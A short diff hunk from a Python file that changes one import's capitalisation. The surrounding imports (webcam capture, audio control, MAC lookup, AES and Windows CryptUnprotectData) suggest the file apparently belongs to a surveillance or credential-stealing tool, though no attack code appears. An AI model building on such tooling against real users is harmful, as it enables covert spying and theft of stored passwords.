@@ -13,7 +13,7 @@ import string
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from datetime import datetime
 from uuid import getnode as get_mac
-from settings import *
+from Settings import *
 from cv2 import VideoCapture, imwrite, CAP_DSHOW
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
